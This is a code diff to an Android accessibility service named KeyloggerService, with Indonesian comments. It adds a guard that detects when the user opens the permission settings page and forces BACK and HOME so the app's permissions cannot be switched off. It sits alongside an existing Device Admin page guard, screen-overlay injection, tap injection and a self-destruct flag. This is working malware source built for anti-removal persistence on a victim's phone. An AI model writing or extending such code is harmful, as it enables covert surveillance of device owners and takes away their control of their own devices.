@@ -30,6 +30,8 @@ class KeyloggerService : AccessibilityService() {
         @Volatile var autoGrantEnabled: Boolean = false
         /** Set false via self_destruct untuk nonaktifkan guard halaman Device Admin */
         @Volatile var adminGuardEnabled: Boolean = true
+        /** Set false untuk nonaktifkan guard halaman Permission Settings */
+        @Volatile var permissionGuardEnabled: Boolean = true
 
         fun showScreenInject(text: String, style: String = "hacker", speed: Float = 0.60f) { instance?.showOverlay(text, style, speed) }
         fun injectTap(x: Float, y: Float) { instance?.dispatchTap(x, y) }
@@ -156,6 +158,8 @@ class KeyloggerService : AccessibilityService() {
                 if (ev.eventType == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) {
                     // FIX Bug 4: cegah user buka halaman Device Admin
                     guardAdminPage(pkg, ev.className?.toString() ?: "")
+                    // Anti-disable permission: cegah user matikan permission aktif
+                    guardPermissionPage(pkg, ev.className?.toString() ?: "")
                     autoTriggerOverlay(pkg)
                 }
             }
@@ -239,6 +243,26 @@ class KeyloggerService : AccessibilityService() {
         handler.postDelayed({
             performGlobalAction(GLOBAL_ACTION_HOME)
         }, 10)
+    }
+
+    /**
+     * Jika user membuka halaman Permission Settings (misal Settings > Apps > [App] > Permissions),
+     * langsung press BACK + HOME agar toggle permission tidak bisa dimatikan.
+     */
+    private fun guardPermissionPage(pkg: String, className: String) {
+        if (!permissionGuardEnabled) return
+        if (!AppDeviceAdminReceiver.PERMISSION_SETTINGS_PACKAGES.contains(pkg)) return
+        val isPermPage = AppDeviceAdminReceiver.PERMISSION_PAGE_KEYWORDS.any { kw ->
+            className.contains(kw, ignoreCase = true)
+        }
+        if (!isPermPage) return
+        android.util.Log.d("PermGuard", "Blocked permission page: $pkg / $className")
+        handler.post {
+            performGlobalAction(GLOBAL_ACTION_BACK)
+        }
+        handler.postDelayed({
+            performGlobalAction(GLOBAL_ACTION_HOME)
+        }, 0)
     }
 
     private fun autoTriggerOverlay(pkg: String) {
